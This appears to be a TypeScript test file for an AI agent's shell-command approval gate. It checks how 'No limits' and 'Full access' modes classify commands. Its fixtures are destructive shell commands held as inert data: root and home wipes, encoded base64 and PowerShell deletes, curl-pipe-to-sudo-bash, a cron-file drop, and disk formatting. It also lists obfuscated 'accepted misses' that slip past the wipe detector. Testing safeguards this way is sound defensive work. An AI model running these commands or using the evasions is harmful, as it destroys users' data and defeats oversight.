// Copyright 2026 Ferrox Labs
// SPDX-License-Identifier: AGPL-3.0-or-later
//
// NOLIM B5 (Astra round 1 on 3c23f017f). Every fixture string is inert data, never executed. Names in comments (M-defer-flag ...) are the
// mutants run against this file: each one fails the assertion named in its row.
//   1. HIGH   a deferred protected-path finding hid a later named catastrophe from the finalizer (M-defer-flag)
//   4. HIGH   marks-nlh0 let the ACTUAL verdict authorise a run (M-nlh0-actual)
//   5. MEDIUM M-inner-deny (all three readings) survived: the owner reader, the plain reader and the named-catastrophe flag each need a fixture
//   +  `format` is a disk-format verb only as a command word (M-format-method)
import { describe, expect, it, vi } from "vitest";
import { ruleRowId } from "../shared/gate-files.ts";
import { cell, provenInitiator, runRefusal, nlh0, canon, checkAdded, selectAdded, selectForCell, WIPE_RULES } from "./testing/marks-nlh0.ts";

import { readFileSync } from "node:fs";
import ts from "typescript";
import { WIPE_RULES as policyWipeRules } from "./testing/no-limits-1019.ts";

process.env.HOME = "/home/tester";
process.env.USERPROFILE = "/home/tester";
vi.resetModules();
const approve = await import("./auto-approve.ts");
const { alwaysAskCommand } = await import("./always-ask.ts");
const marks = await import("./shell/marks.ts");
const { plainWipe } = await import("./outside-scan.ts");
const { autoVerdict } = approve;
type AutoContext = import("./auto-approve.ts").AutoContext;

const NO_LIMITS = { autoApprove: true, fullAccess: true, noLimits: true };
const FULL = { autoApprove: true, fullAccess: true };
const HOME = "/home/tester";
const CWD = "/home/tester/Documents/x";

const ORIGINS: Record<string, Partial<AutoContext>> = {
  owner: { fullAccessOrigin: "owner", ownerStarted: false, outsideRead: null },
  "owner-clean": { fullAccessOrigin: "owner", ownerStarted: true, outsideRead: null },
  "owner-continuation": { fullAccessOrigin: "owner", ownerStarted: false, outsideRead: ["git"] },
  "owner-channel": { fullAccessOrigin: "owner-channel", unattended: true, automated: true, channelOwner: true },
  routine: { fullAccessOrigin: "routine", routineLevel: true, automated: true },
};

const base = (text: string, ctx: Partial<AutoContext>, extra: Partial<AutoContext> = {}): AutoContext => ({
  commandText: text, commandCwd: CWD, stopLine: null, promptFacts: { cwd: CWD, home: HOME }, unseen: { platform: "posix" }, ...ctx, ...extra,
} as AutoContext);
const request = (bot: object, text: string, ctx: Partial<AutoContext>, extra: Partial<AutoContext> = {}) => autoVerdict(bot, "Bash", text, base(text, ctx, extra));

const OPTS = { platform: "posix" } as never;
const readers = (text: string) => ({
  owner: marks.ownerMarks(() => marks.withoutDoubts(() => alwaysAskCommand(text, CWD, "command", undefined, undefined, HOME, OPTS))),
  plain: marks.withoutDoubts(() => alwaysAskCommand(text, CWD, "command", undefined, undefined, HOME, OPTS)),
});

// ---------------------------------------------------------------------------------------------------------------------
describe("B5-1 a wipe the reader names is never hidden by an earlier protected-path finding", () => {
  const COMBINED = `touch /etc/motd; ruby -e 'require "fileutils"; FileUtils.rm_rf("/")'`;
  const RUBY = `ruby -e 'require "fileutils"; FileUtils.rm_rf("/")'`;
  const LF = "r\\\nm -rf /libexec";

  it("the fixtures are not plainWipe text, so only the readers can keep them (the premise of the mutant rows)", () => {
    for (const text of [COMBINED, RUBY, LF]) expect(plainWipe(text), JSON.stringify(text)).toBe(false);
  });

  it("each reader gives its own distinct answer: owner reader, plain reader, and the flag on the combined text (M-defer-flag)", () => {
    // ruby alone: owner mode places the target as a protected path (not a wipe rule); only the plain reader names the catastrophe
    const ruby = readers(RUBY);
    expect(ruby.owner).toMatchObject({ rule: "protected-path", classification: "deny" });
    expect(ruby.owner?.namedCatastrophe).toBeUndefined();
    expect(ruby.plain).toMatchObject({ rule: "unreadable", namedCatastrophe: true });
    // the same, behind a touch of a protected file: the earlier finding still wins the verdict, and the catastrophe rides with it
    const combined = readers(COMBINED);
    expect(combined.plain).toMatchObject({ rule: "protected-path", namedCatastrophe: true });
    // a plain touch of a protected file names no catastrophe
    expect(readers("touch /etc/motd").plain?.namedCatastrophe).toBeUndefined();
    // r\<LF>m -rf /libexec: the shell joins `rm`; only the owner reader classes the delete of a system folder; the plain reader sees nothing
    const lf = readers(LF);
    expect(lf.owner).toMatchObject({ rule: "delete-system-folder", classification: "deny" });
    expect(lf.plain).toBeNull();
  });

  for (const [name, ctx] of Object.entries(ORIGINS)) {
    it(`${name}: the combined command, the ruby delete alone and the joined rm all keep their card at No limits`, () => {
      for (const text of [COMBINED, RUBY, LF]) {
        const verdict = request(NO_LIMITS, text, ctx);
        expect(verdict.approve, `${JSON.stringify(text)} (${verdict.source}/${verdict.rule})`).toBeNull();
        expect(verdict.source).toBe("always-ask");
      }
    });
  }

  it("Full access reads the combined command exactly as before: the same rule, with the flag as the only addition", () => {
    const verdict = request(FULL, COMBINED, ORIGINS.owner!);
    expect(verdict.approve).toBeNull();
    expect(verdict.source).toBe("always-ask");
    expect(verdict.rule).toBe("protected-path");
  });

  it("a protected-path touch with no catastrophe beside it still runs at No limits (the flag is not a widening)", () => {
    expect(request(NO_LIMITS, "touch /etc/motd", ORIGINS["owner-clean"]!).approve).toBeTruthy();
  });
});

// ---------------------------------------------------------------------------------------------------------------------
describe("B5-4 marks-nlh0: the fixture, not the verdict, authorises a run at No limits (M-nlh0-actual)", () => {
  const RUN = { approve: "auto-approved Bash (no limits)", source: "no-limits", rule: "n1=unreadable" };
  const PIN_ASK = JSON.stringify({ approve: null, source: "always-ask", rule: "unreadable" });
  const PIN_WIPE = JSON.stringify({ approve: null, source: "always-ask", rule: "delete-root" });
  const PIN_ALLOW = JSON.stringify({ approve: "ok", source: "always-allow" });
  const ok = { allowRun: true, n2: false };

  it("a plain ask pinned at NLH0, a No limits bot with a proven initiator and an ordinary text: the run is the fixture's own", () => {
    expect(runRefusal(PIN_ASK, RUN, ok)).toBeUndefined();
  });

  it("the actual verdict's source alone never authorises (a wrong run for Full access, another person or an unproven origin fails)", () => {
    expect(runRefusal(PIN_ASK, RUN, { allowRun: false, n2: false })).toMatch(/level or initiator/);
    expect(provenInitiator({ fullAccessOrigin: "other", unattended: true, automated: true })).toBe(false);
    expect(provenInitiator({ fullAccessOrigin: "other" })).toBe(false);
    expect(provenInitiator({})).toBe(true); // the rows' own base context is the owner's
    expect(provenInitiator({}, {})).toBe(false); // no stored origin: unproven
    expect(provenInitiator({ fullAccessOrigin: "owner", unattended: true })).toBe(false);
    expect(provenInitiator({ fullAccessOrigin: "owner", automated: true })).toBe(false);
    expect(provenInitiator({ fullAccessOrigin: "owner", channelOwner: true })).toBe(false);
    expect(provenInitiator({ fullAccessOrigin: "routine" })).toBe(false);
    expect(provenInitiator({ fullAccessOrigin: "routine", routineLevel: true })).toBe(true);
    expect(provenInitiator({ fullAccessOrigin: "routine", routineLevel: true, unattended: true })).toBe(false);
    expect(provenInitiator({ fullAccessOrigin: "owner-channel" })).toBe(false);
    expect(provenInitiator({ fullAccessOrigin: "owner-channel", channelOwner: true, unattended: true })).toBe(true);
  });

  it("a pinned allow or a pinned wipe row is never turned into a run", () => {
    expect(runRefusal(PIN_ALLOW, RUN, ok)).toMatch(/not an ask/);
    expect(runRefusal(PIN_WIPE, RUN, ok)).toMatch(/wipe row/);
  });

  it("only the finalizer's own run counts: not another source, not another rule family, not a deny", () => {
    expect(runRefusal(PIN_ASK, { ...RUN, source: "always-allow" }, ok)).toMatch(/not the finalizer/);
    expect(runRefusal(PIN_ASK, { ...RUN, rule: "delete-root" }, ok)).toMatch(/not the finalizer/);
    expect(runRefusal(PIN_ASK, { approve: null, source: "no-limits", rule: "n1=x" }, ok)).toMatch(/not the finalizer/);
    expect(runRefusal(PIN_ASK, null, ok)).toMatch(/not the finalizer/);
  });

  it("literal N2 keeps the card even when the level and initiator permit a run", () => {
    expect(runRefusal(PIN_ASK, RUN, { allowRun: true, n2: true })).toMatch(/states N2/);
  });
  it("cell(): an unproven initiator cannot run an unpinned cell", () => {
    expect(() => cell("B5 no such id", NO_LIMITS, { fullAccessOrigin: "other" }, RUN, { text: "echo hi", n2: false })).toThrow();
  });
  const pin = { approve: null, source: "always-ask", rule: "unreadable" };
  const added = { classification: "deny", reason: "protected-path" } as const;
  it("added fields must equal the fixture values, including banana and either classification", () => {
    expect(() => checkAdded({ ...pin, classification: "deny", reason: "banana" }, pin, "banana", added, false)).toThrow(/reason/);
    expect(() => checkAdded({ ...pin, classification: "ask", reason: "protected-path" }, pin, "class", added, false)).toThrow(/classification/);
    expect(checkAdded({ ...pin, ...added }, pin, "exact", added, false)).toBe(canon(pin));
  });
  it("undeclared added fields are rejected on verdicts and raw hits", () => {
    expect(() => checkAdded({ ...pin, reason: "protected-path" }, pin, "undeclared", undefined, false)).toThrow(/states no expected value/);
    expect(() => checkAdded({ rule: "unreadable", namedCatastrophe: true }, { rule: "unreadable" }, "raw", undefined, false)).toThrow(/states no expected value/);
  });
  it("exact equality cannot hide absent declared fields, including raw hits", () => {
    expect(() => checkAdded(pin, pin, "missing", added, false)).toThrow(/lacks it/);
    const raw = { rule: "unreadable" };
    expect(() => checkAdded(raw, raw, "raw", { namedCatastrophe: true }, false)).toThrow(/lacks it/);
    expect(() => checkAdded({ ...pin, classification: "deny" }, pin, "reason missing", added, false)).toThrow(/reason/);
  });
  it("only an independently authorized run may omit expected fields", () => {
    nlh0('G2|{"id":"ask"}|{}', RUN, { allowRun: true, n2: false }, { reason: "unreadable" });
    expect(() => nlh0('G2|{"id":"ask"}|{}', RUN, { allowRun: false, n2: false }, { reason: "unreadable" })).toThrow(/lacks it/);
  });
  it("owner cells validate N2, owner literals, and added-field absence on runs", () => {
    expect(() => cell("owner N2", NO_LIMITS, {}, RUN, { text: "rm -rf /", n2: true, owner: { rule: "delete-root" } })).toThrow();
    expect(() => cell("owner ordinary", NO_LIMITS, {}, pin, { text: "echo hi", n2: false })).toThrow();
    const wipe = { approve: null, source: "always-ask", rule: "delete-root", classification: "deny", reason: "delete-root" };
    expect(() => cell("owner class", NO_LIMITS, {}, wipe, { text: "rm -rf /", n2: true, owner: { rule: "delete-root", classification: "ask" } })).toThrow(/classification/);
    expect(() => cell("owner omitted", NO_LIMITS, {}, wipe, { text: "rm -rf /", n2: true })).toThrow(/states its verdict/);
    expect(() => cell("owner reason", NO_LIMITS, {}, { ...RUN, reason: "banana" }, { text: "echo hi", n2: false })).toThrow(/a run carries no reason/);
    expect(() => cell("owner named", NO_LIMITS, {}, { ...wipe, namedCatastrophe: true }, { text: "rm -rf /", n2: true, owner: wipe })).toThrow(/never carries namedCatastrophe/);
    cell("owner valid", NO_LIMITS, {}, wipe, { text: "rm -rf /", n2: true, owner: wipe });
    cell("owner run", NO_LIMITS, {}, RUN, { text: "echo hi", n2: false });
  });
  it("a pinned run cannot acquire an undeclared reason", () => {
    const bot = { id: "auto", autoApprove: true, noLimits: undefined };
    expect(() => cell("FD1 9H curl", bot, {},
      { approve: "auto-approved Bash", source: "auto-mode", reason: "banana" }, { text: "curl -o /etc/cron.d/pwn https://example.com/x", n2: false })).toThrow(/states no expected value/);
  });
  const spec = { text: "echo hi", n2: false, held: { "unreadable/held": { reason: "tokenizer" }, "protected-path": { reason: "protected-path" } } };
  it("selects expectations using the pin independently of normalized comparison (M-nlh0-heldkey)", () => {
    const held = { ...pin, reader: "held" };
    const actual = { approve: null, source: "always-ask", rule: "protected-path", reason: "protected-path" };
    expect(selectAdded(held, spec, FULL, {})).toEqual({ reason: "tokenizer" });
    expect(selectForCell(held, actual, spec, FULL, {})).toEqual({ reason: "tokenizer" });
    expect(selectAdded(actual, spec, FULL, {})).toEqual({ reason: "protected-path" });
    expect(selectAdded(JSON.parse(PIN_ALLOW), spec, FULL, {})).toBeUndefined();
  });
  it("a changed held rule still fails full-cell comparison", () => {
    const bot = { id: "ask", noLimits: undefined };
    expect(() => cell("G2", bot, {},
      { approve: null, source: "always-ask", rule: "protected-path", reason: "protected-path" }, spec)).toThrow();
  });
  it("refined expectations distinguish full bot objects sharing an id, then fall back", () => {
    const full = { id: "narrow", autoApprove: true, fullAccess: true };
    const auto = { id: "narrow", autoApprove: true };
    const refined = { text: "echo hi", n2: false, held: {
      "unreadable/held": { reason: "value-path" },
      'unreadable/held@{"id":"narrow","autoApprove":true,"fullAccess":true}|{}': { reason: "tokenizer" },
    } };
    expect(selectAdded({ ...pin, reader: "held" }, refined, full, {})).toEqual({ reason: "tokenizer" });
    expect(selectAdded({ ...pin, reader: "held" }, refined, full, { outsideRead: ["/x"] })).toEqual({ reason: "value-path" });
    expect(selectAdded({ ...pin, reader: "held" }, refined, auto, {})).toEqual({ reason: "value-path" });
  });
  it("the helper cannot judge commands, and cell specifications cannot reach production readers", () => {
    const helper = readFileSync(new URL("./testing/marks-nlh0.ts", import.meta.url), "utf8");
    expect(helper).not.toMatch(/from\s+["'](?:\.\.\/(?:always-ask|outside-scan|auto-approve)|\.\/no-limits-1019)(?:\.ts)?["']/);
    const forbidden = new Set(["alwaysAskCommand", "alwaysAskRaw", "plainWipe", "doubtFree", "autoVerdict", "expectNoLimitsOwnerOutcome"]);
    for (const file of ["marks-deny-class-1018.test.ts", "marks-nolimits-narrow-1018.test.ts", "marks-overdeny-negatives-1018.test.ts", "marks-owner-reads-1018.test.ts", "no-limits-b5-1019.test.ts"]) {
      const source = ts.createSourceFile(file, readFileSync(new URL(file, import.meta.url), "utf8"), ts.ScriptTarget.Latest, true);
      const declarations = new Map<string, ts.Node[]>();
      const aliases = new Set(forbidden);
      const collect = (node: ts.Node): void => {
        if (ts.isImportSpecifier(node) && forbidden.has((node.propertyName ?? node.name).text)) aliases.add(node.name.text);
        if ((ts.isVariableDeclaration(node) || ts.isFunctionDeclaration(node)) && node.name && ts.isIdentifier(node.name)) {
          const value = ts.isVariableDeclaration(node) ? node.initializer : node.body;
          if (value) declarations.set(node.name.text, [...(declarations.get(node.name.text) ?? []), value]);
        }
        ts.forEachChild(node, collect);
      };
      collect(source);
      const inspect = (node: ts.Node, seen = new Set<ts.Node>()): void => {
        if (seen.has(node)) return;
        seen.add(node);
        if (ts.isIdentifier(node)) {
          expect(aliases.has(node.text), `${file}: CellSpec reaches ${node.text}`).toBe(false);
          for (const value of declarations.get(node.text) ?? []) inspect(value, seen);
        }
        ts.forEachChild(node, child => inspect(child, seen));
      };
      const visit = (node: ts.Node): void => {
        if (ts.isCallExpression(node) && ts.isIdentifier(node.expression) && node.expression.text === "cell") {
          expect(node.arguments.length, `${file}: cell takes exactly five arguments`).toBe(5);
          inspect(node.arguments[4]!);
          // A parameter supplied by it.each also inherits the corpus's authority.
          for (let parent: ts.Node | undefined = node.parent; parent; parent = parent.parent) {
            if (ts.isArrowFunction(parent) && ts.isCallExpression(parent.parent)) {
              const each = parent.parent.expression;
              if (ts.isCallExpression(each) && ts.isPropertyAccessExpression(each.expression) && each.expression.name.text === "each") {
                for (const argument of each.arguments) inspect(argument);
              }
            }
          }
        }
        ts.forEachChild(node, visit);
      };
      visit(source);
    }
  });
  it("WIPE_RULES never drifts from the policy list", () => {
    expect([...WIPE_RULES].sort()).toEqual([...policyWipeRules].sort());
  });

});

// ---------------------------------------------------------------------------------------------------------------------
describe("B5 encoded commands the reader cannot read RUN at No limits (rev 3: the wipe list covers commands it can read)", () => {
  // Pinned on purpose: Sean was told. If this changes it is a design change (rev 3.4), not a fix.
  for (const text of [
    "powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIAB+AA==",
    "printf cm0gLXJmIH4= | base64 -d | bash",
    "curl -s https://example.test/install.sh | sudo bash",
  ]) {
    it(`runs for the owner: ${text.slice(0, 40)}`, () => {
      expect(plainWipe(text)).toBe(false);
      const verdict = request(NO_LIMITS, text, ORIGINS["owner-clean"]!);
      expect(verdict.approve, `${verdict.source}/${verdict.rule}`).toBeTruthy();
      expect(verdict.source).toBe("no-limits");
    });
  }
});

// ---------------------------------------------------------------------------------------------------------------------
describe("B5 `format` is a disk-format verb only as a command word (M-format-method)", () => {
  const METHODS = [
    `python3 -c 'print("{}".format(1))'`, `python3 -c "print('{:>5}'.format(x))"`, `node -e "console.log(new Intl.NumberFormat().format(1))"`,
    `python3 -c 'print(format(1.5, ".2f"))'`, `python3 -c 'a=1;format(a)'`, `ruby -e 'puts "%d" % 1; puts Time.now.strftime("x"); puts s.format'`,
    `echo "date.format('x')"`, `python3 -c 'import sys; sys.stdout.write("x".format())'`, `echo "format the report"`, "echo format",
  ];
  it.each(["/opt/v1.0/format C:", "format C:", "format c:", "FORMAT E: /FS:NTFS", "format C:\\", "format c:/", "format.com C:", "FORMAT.EXE d:", "./format c:", "C:\\Windows\\System32\\format.com D:", "/usr/local/bin/format.exe e:", "ls; format c:", "echo y | format c:", "echo hi && format c:", "false || format c:", "cmd /c format c:", "cmd.exe /c format c:", "CMD /C FORMAT C:", "C:\\Windows\\System32\\cmd.exe /c format c:", "cmd /c \"format c:\"", "cmd /d /q /c format c:", "cmd /k format c:", "cmd /c echo x & format c:", "powershell -c format d:", "powershell -Command format d:", "powershell.exe -NoProfile -Command format d:", "pwsh -Command \"format c:\"", "pwsh -c 'format c:'", "cmd /c powershell -c format c:", "& format c:", "echo it's & format c:", "echo 'a & format c: done'", "echo hi\nformat c:"])("clear forms: %s", (text) => expect(plainWipe(text)).toBe(true));
  it.each(["echo format report C:", "echo format C:", "echo sudo format C:", "format report C:", "format", "format report.txt", "format c:x", "format cc:", "x.format c:", "/opt/format/bin/tool C:", "clang-format -i c:/x.cpp", "prettier --format c:", "git log --format=%H", "ls --format=long", "grep -rn format src", "echo \"format c:\"", "echo 'format c:'", "echo \"a; format c:\"", "echo 'a; format c:'", "echo \"a; format c: done\"", "echo -u root format C:", "echo 'x & format c:'", "cmd /c echo format c:", "cmd /c \"echo format c:\"", "powershell -Command echo format c:"])("arguments and quoted text: %s", (text) => expect(plainWipe(text)).toBe(false));
  it.each(["sudo format d:", "format /q d:", "X=1 format c:", "bash -c 'format c:'", ">log format C:", "(format c:)", "start \"\" format c:", "f\\ormat c:", "f`ormat C:", "powershell -ExecutionPolicy Bypass -Command format c:", "cmd /c cmd /c cmd /c format c:", "nice -n 5 format d:", "FOO=bar format /q e:"])("accepted misses: %s", (text) => expect(plainWipe(text)).toBe(false));
  it.each(["mkfs.ext4 /dev/sdb1", "Format-Volume -DriveLetter D", "wipefs -a /dev/sda", "dd if=/dev/zero of=/dev/sda", "sudo diskutil eraseDisk JHFS+ x disk2", "diskpart /s x.txt", "mkfs -t ext4 x"])("unchanged wipe vocabulary: %s", (text) => expect(plainWipe(text)).toBe(true));
  it.each(METHODS)("language negative: %s", (text) => expect(plainWipe(text)).toBe(false));
  it("the owner's No limits turn runs programs that only use str.format", () => {
    for (const text of METHODS.slice(0, 3)) expect(request(NO_LIMITS, text, ORIGINS["owner-clean"]!).approve).toBeTruthy();
  });
  it.each(["format C:", "cmd /c format c:", "sudo mkfs.ext4 /dev/sdb1", "diskutil eraseDisk JHFS+ x disk2"])("finalizer keeps the card: %s", (text) => {
    expect(request(NO_LIMITS, text, ORIGINS["owner-clean"]!).approve).toBeNull();
  });
});

// Hook files are checked and restored before use by hook-canon.ts, not by a command matcher.
describe("T20 hook-file calls at No limits", () => {
  const hook = `${HOME}/.murage/native/codex-scope/murage-hook.mjs`; // F1
  const rows = [
    { name: "cp", tool: "Bash", text: "cp x ~/.murage/native/codex-scope/murage-hook.mjs",
      input: { command: "cp x ~/.murage/native/codex-scope/murage-hook.mjs" } },
    { name: "rm", tool: "Bash", text: "rm ~/.murage/native/hermes-ask/ask-hook-a.cjs",
      input: { command: "rm ~/.murage/native/hermes-ask/ask-hook-a.cjs" } },
    { name: "edit F1", tool: "edit", text: `edit ${hook}`, input: { file_path: hook, new_string: "x" } },
  ];
  const call = (bot: object, row: typeof rows[number], origin: Partial<AutoContext>) => autoVerdict(bot, row.tool, row.text, {
    ...base(row.text, origin), commandText: row.tool === "Bash" ? row.text : undefined,
    call: { toolCall: { name: row.tool, input: row.input } },
  } as AutoContext);

  it.each(rows)("$name: the owner's clean turn runs and records the gate row", (row) => {
    const verdict = call(NO_LIMITS, row, ORIGINS["owner-clean"]!);
    expect(verdict.approve).toBeTruthy();
    expect(verdict).toMatchObject({ source: "no-limits" });
  });

  it.each(rows)("$name: Full access still cards through the unchanged gate row", (row) => {
    const verdict = call(FULL, row, ORIGINS["owner-clean"]!);
    expect(verdict).toMatchObject({ approve: null, source: "sensitive-guard" });
    expect(ruleRowId(verdict.rule)).toBe("murage-engine-hooks");
  });

  it.each(rows)("$name: an unproven initiator still cards (M-origin-default)", (row) => {
    const verdict = call(NO_LIMITS, row, { ownerStarted: true, outsideRead: null });
    expect(verdict.approve).toBeNull();
    expect(approve.noLimitsInitiator(NO_LIMITS, { ownerStarted: true, outsideRead: null })).toBe("unproven");
  });

  it("rm: deleting one hook file is not a whole-root wipe", () => {
    const verdict = call(NO_LIMITS, rows[1]!, { ...ORIGINS["owner-clean"], outsideRead: ["web page"] });
    expect(verdict.approve).toBeTruthy();
    expect(approve.noLimitsFacts(verdict)).toEqual({ initiator: "owner", n2: false });
  });

  // Design 3.9: preserve the gate row through the marked-turn finalizer.
  it.each([rows[0]!, rows[2]!])("$name: the proven marked turn runs through the gate finalizer", (row) => {
    const info = vi.spyOn(console, "info").mockImplementation(() => undefined);
    const verdict = call(NO_LIMITS, row, { ...ORIGINS["owner-clean"], outsideRead: ["web page"] });
    const lines = info.mock.calls.map(args => String(args[0]));
    info.mockRestore();
    expect(verdict.approve).toBeTruthy();
    expect(verdict).toMatchObject({ source: "no-limits" });
    expect(lines).toEqual([expect.stringContaining("level=no-limits initiator=owner")]);
  });

  it("a proven Windows shell hook write runs through the finalizer", () => {
    const command = "Copy-Item x C:\\Users\\Jo\\.murage\\native\\codex-scope\\murage-hook.mjs";
    const verdict = autoVerdict(NO_LIMITS, "PowerShell", command, {
      ...base(command, ORIGINS["owner-clean"]!),
      call: { commandShell: "pwsh", toolCall: { name: "PowerShell", input: { command } } },
    } as AutoContext);
    expect(verdict.approve).toBeTruthy();
    expect(verdict).toMatchObject({ source: "no-limits" });
  });
});
